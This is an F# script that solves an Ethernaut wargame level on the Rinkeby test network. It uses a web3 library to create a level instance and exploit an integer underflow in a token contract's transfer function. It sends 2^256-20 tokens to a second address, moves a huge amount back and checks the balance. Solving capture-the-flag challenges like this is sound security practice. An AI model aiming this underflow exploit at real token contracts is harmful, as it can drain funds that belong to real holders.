#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.4.13"

open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let web3c = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let monitor = createReceiptMonitor web3c

let call = makeEthCall web3c constants
let txn = makeEthTxn web3c constants

let ethernautContractAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
let ethernautABI = """[{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"createLevelInstance","outputs":[],"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"contractLevel","name":"level","type":"address"}],"name":"LevelCompletedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"address","name":"instance","type":"address"}],"name":"LevelInstanceCreatedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"registerLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"_instance","type":"address"}],"name":"submitLevelInstance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI

// Load up our contract, set deeper partials
let deployedEthernaut = loadDeployedContract digest ethernautContractAddress RINKEBY ethernautABI |> bindDeployedContract |> List.head
let callEthernaut = call deployedEthernaut
let txnEthernaut = txn deployedEthernaut
let submitInstance = txnEthernaut (ByString "submitLevelInstance") 

// Get a level instance, you pass in the address of ( I guess) the base or prototype of the contract, and you
// get a copy, logged via the Event emitted inside `createLevelInstance` 
txnEthernaut (ByString "createLevelInstance") [Address "0x63bE8347A617476CA461649897238A31835a32CE"] "0"
|> monitorTransaction monitor

// win condition get "any additional tokens"...nice and vague

let level5ABI = """[{"inputs":[{"internalType":"uint256","name":"_initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]""" |> ABI

let token = loadDeployedContract digest "0x5dca493e0836d3183c1b131c06a5214e4d6388a2" RINKEBY level5ABI |> bindDeployedContract |> List.head
let callToken = makeEthCall web3c constants token
let txnToken = makeEthTxn web3c constants token

// Okay, so this is an integer underflow issue, it would seem. My initial address will end up with 40 tokens after the initial 'compromise'
// and then I'll use the second address to send a huge chunk back to myself.
let constants2 = createDefaultConstants "0xe5c511f44de51360941ec26eaa6f137aa214d837"

let chungus = (bigint.Pow(2, 256) - 20I).ToString()

// Send initial underflow
txnToken (ByString "transfer") [Address "0xe5c511f44de51360941ec26eaa6f137aa214d837"; Uint256 chungus] ZEROV
|> monitorTransaction monitor
|> logCallResult


// Send some back to myself
makeEthTxn web3c constants2 token (ByString "transfer") [Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"; Uint256 "10086879078532699846656405640"] ZEROV
|> monitorTransaction monitor
|> logCallResult

callToken (ByString "balanceOf") [Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"]
|> logCallResult
